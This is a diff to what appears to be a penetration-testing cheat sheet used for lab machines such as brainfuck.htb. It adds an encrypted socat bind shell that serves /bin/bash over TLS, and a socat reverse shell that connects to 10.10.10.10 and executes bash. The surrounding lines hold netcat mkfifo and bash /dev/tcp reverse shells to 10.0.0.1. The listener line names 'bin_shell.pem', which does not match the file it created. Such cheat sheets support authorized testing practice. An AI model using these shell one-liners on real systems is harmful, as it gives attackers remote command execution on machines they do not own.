@@ -893,6 +893,19 @@ john id_rsa.hash --wordlist=<wordlist>
 wpscan --url https://brainfuck.htb --disable-tls-checks
 ```
 
+# Encrypted Bind Shell
+## Socat
+```
+# Create Cert and Key
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+# Create .pem file
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+# Setup Listener
+sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
+# Connect
+socat - OPENSSL:10.10.10.10:443,verify=0
+```
+
 # Reverse Shells
 ## Netcat
 ```
@@ -903,6 +916,14 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f # in
 ## Bash
 ```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+```
+
+## Socat
+```
+# Listener
+socat -d -d TCP4-LISTEN:443 STDOUT
+# Send bash reverse shell
+socat TCP4:10.10.10.10:443 EXEC:/bin/bash
 ```
 
 ## Perl
